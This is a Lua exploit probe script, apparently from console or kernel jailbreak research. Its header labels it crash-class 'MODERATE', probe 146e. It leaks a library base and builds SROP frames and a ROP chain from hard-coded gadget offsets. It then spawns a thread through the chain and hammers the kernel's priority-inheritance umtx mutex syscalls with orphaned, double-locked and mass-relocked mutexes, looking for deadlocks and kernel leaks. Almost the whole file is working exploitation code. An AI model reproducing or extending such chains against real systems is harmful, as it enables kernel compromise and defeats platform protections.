-- CRASH_CLASS: MODERATE
-- PROBE 146e: Orphaned PI mutex with timeout + manual clear
--
-- 146d showed: lock with OWNER_DEAD blocks forever (kernel deadlock?)
-- Test: timeout lock, manual owner clear, trylock after clear

print("=== PROBE 146e: ORPHAN TIMEOUT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr = make_syscall(430)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
print("gpu=0x" .. string.format("%X%08X", gh, gl))

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_wr      = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))

-- [A] Create orphan: thread locks PI mutex, exits
print("--- [A] ORPHAN ---")

local mtx = gpu + 0x1000
local mtx_addr = uint64(string.format("0x%X%08X", gh, gl + 0x1000))
wd(mtx, 0)
wd(mtx + 4, 4)
for off = 8, 47, 4 do wd(mtx + off, 0) end

local doneA = gpu + 0x2000
wq(doneA, uint64(0))
local doneA_a = uint64(string.format("0x%X%08X", gh, gl + 0x2000))

local ts_s = gpu + 0x3000
wq(ts_s, uint64(0))
wq(ts_s + 8, uint64(50000000))
local ts_s_a = uint64(string.format("0x%X%08X", gh, gl + 0x3000))

local rop = gpu + 0x10000
local rop_a = uint64(string.format("0x%X%08X", gh, gl + 0x10000))
local i = 0

wq(rop+i, g_pop_rdi); i=i+8
wq(rop+i, ts_s_a); i=i+8
wq(rop+i, g_pop_rsi); i=i+8
wq(rop+i, uint64(0)); i=i+8
wq(rop+i, g_pop_rax); i=i+8
wq(rop+i, uint64(240)); i=i+8
wq(rop+i, sc_addr); i=i+8

wq(rop+i, g_pop_rdi); i=i+8
wq(rop+i, mtx_addr); i=i+8
wq(rop+i, g_pop_rsi); i=i+8
wq(rop+i, uint64(5)); i=i+8
wq(rop+i, g_pop_rax); i=i+8
wq(rop+i, uint64(454)); i=i+8
wq(rop+i, sc_addr); i=i+8

wq(rop+i, g_pop_rax); i=i+8
wq(rop+i, uint64("0x00000000AAAA0001")); i=i+8
wq(rop+i, g_pop_rdi); i=i+8
wq(rop+i, doneA_a); i=i+8
wq(rop+i, g_wr); i=i+8

wq(rop+i, g_pop_rdi); i=i+8
wq(rop+i, uint64(0)); i=i+8
wq(rop+i, g_pop_rsi); i=i+8
wq(rop+i, uint64(0)); i=i+8
wq(rop+i, g_pop_rax); i=i+8
wq(rop+i, uint64(431)); i=i+8
wq(rop+i, sc_addr); i=i+8

local tctx = gpu + 0x20000
for off = 0, 0x4FF, 4 do wd(tctx + off, 0) end
pcall(function() return sc_gc(uint64(tctx)) end)
wq(tctx + 0xE0, g_ret)
wq(tctx + 0xF8, rop_a)
wq(tctx + MC + 0x18, uint64(0))
wq(tctx + MC + 0x50, uint64(0))
wq(tctx + MC + 0x28, uint64(0))
wq(tctx + MC + 0x30, uint64(0))

local tbuf = gpu + 0x30000
wq(tbuf, uint64(0))

local ok_t, rv_t = pcall(function()
    return sc_thr(uint64(tctx), uint64(tbuf), uint64(0))
end)
print("thrA=" .. tostring(rv_t))

local tw = memory.alloc(16)
wq(tw, uint64(0))
wq(tw + 8, uint64(300000000))
pcall(function() make_syscall(240)(uint64(tw), uint64(0)) end)

local owner = to_num(memory.read_dword(mtx))
print("owner=0x" .. string.format("%08X", owner))

-- [B] Manual owner clear: set m_owner=0, then trylock
print("")
print("--- [B] MANUAL CLEAR ---")
wd(mtx, 0) -- clear owner to 0 (unlocked)
print("cleared owner=0x" .. string.format("%08X", to_num(memory.read_dword(mtx))))

-- TRYLOCK should succeed now
local try_rv = srop(454, uint64(mtx_addr), uint64(4), uint64(0), uint64(0), uint64(0))
local try_v = try_rv and to_num(try_rv) or -999
print("trylock_cleared=" .. try_v)
local owner_try = to_num(memory.read_dword(mtx))
print("owner_try=0x" .. string.format("%08X", owner_try))

if try_v == 0 then
    print("*** GOT ORPHAN LOCK ***")
    -- What does the kernel state look like?
    -- The old umtx_pi structure from dead thread might still exist
    -- Check if kernel leaked anything into the mutex structure
    for off = 0, 47, 4 do
        local v = to_num(memory.read_dword(mtx + off))
        if v ~= 0 then
            print("  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
        end
    end

    -- Now unlock
    local ul = srop(454, uint64(mtx_addr), uint64(6), uint64(0), uint64(0), uint64(0))
    print("unlock=" .. (ul and tostring(to_num(ul)) or "nil"))
end

-- [C] Same test with NORMAL mutex (flags=0)
print("")
print("--- [C] NORMAL ORPHAN ---")
local mtx2 = gpu + 0x4000
local mtx2_addr = uint64(string.format("0x%X%08X", gh, gl + 0x4000))
wd(mtx2, 0)
wd(mtx2 + 4, 0) -- flags=0, normal mutex
for off = 8, 47, 4 do wd(mtx2 + off, 0) end

-- Lock from main, then clear manually
local lk = srop(454, uint64(mtx2_addr), uint64(5), uint64(0), uint64(0), uint64(0))
print("lock_normal=" .. (lk and tostring(to_num(lk)) or "nil"))
local o2 = to_num(memory.read_dword(mtx2))
print("owner_normal=0x" .. string.format("%08X", o2))

-- Unlock normally
local ul2 = srop(454, uint64(mtx2_addr), uint64(6), uint64(0), uint64(0), uint64(0))
print("unlock_normal=" .. (ul2 and tostring(to_num(ul2)) or "nil"))

-- [D] Double-lock from same thread (PI)
print("")
print("--- [D] DOUBLE LOCK ---")
local mtx3 = gpu + 0x5000
local mtx3_addr = uint64(string.format("0x%X%08X", gh, gl + 0x5000))
wd(mtx3, 0)
wd(mtx3 + 4, 4) -- PI
for off = 8, 47, 4 do wd(mtx3 + off, 0) end

local dl1 = srop(454, uint64(mtx3_addr), uint64(5), uint64(0), uint64(0), uint64(0))
print("lock1=" .. (dl1 and tostring(to_num(dl1)) or "nil"))
local o3 = to_num(memory.read_dword(mtx3))
print("owner1=0x" .. string.format("%08X", o3))

-- Try locking again (same thread owns it — should return EDEADLK or block)
-- Use TRYLOCK to avoid blocking
local dl2 = srop(454, uint64(mtx3_addr), uint64(4), uint64(0), uint64(0), uint64(0))
print("trylock2=" .. (dl2 and tostring(to_num(dl2)) or "nil"))

-- Unlock
srop(454, uint64(mtx3_addr), uint64(6), uint64(0), uint64(0), uint64(0))

-- [E] Rapid orphan cycle — create many orphaned mutexes
print("")
print("--- [E] MASS ORPHAN ---")
local orphan_count = 0
for idx = 0, 4 do
    local om = gpu + 0x6000 + idx * 0x100
    local om_a = uint64(string.format("0x%X%08X", gh, gl + 0x6000 + idx * 0x100))
    wd(om, 0)
    wd(om + 4, 4)
    for off = 8, 47, 4 do wd(om + off, 0) end

    -- Lock from main
    srop(454, uint64(om_a), uint64(5), uint64(0), uint64(0), uint64(0))
    local ov = to_num(memory.read_dword(om))

    -- Don't unlock — just clear owner manually (simulating orphan)
    wd(om, 0)

    -- Lock again (re-acquiring "orphaned" mutex)
    local rl = srop(454, uint64(om_a), uint64(5), uint64(0), uint64(0), uint64(0))
    if rl and to_num(rl) == 0 then
        orphan_count = orphan_count + 1
        -- Don't unlock, let kernel track the PI chain growth
    end
end
print("orphan_relock=" .. orphan_count .. "/5")

-- Check sys 624 VM ops for any kernel leak
local vm = srop(624)
print("vm_ops=" .. (vm and tostring(to_num(vm)) or "nil"))

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
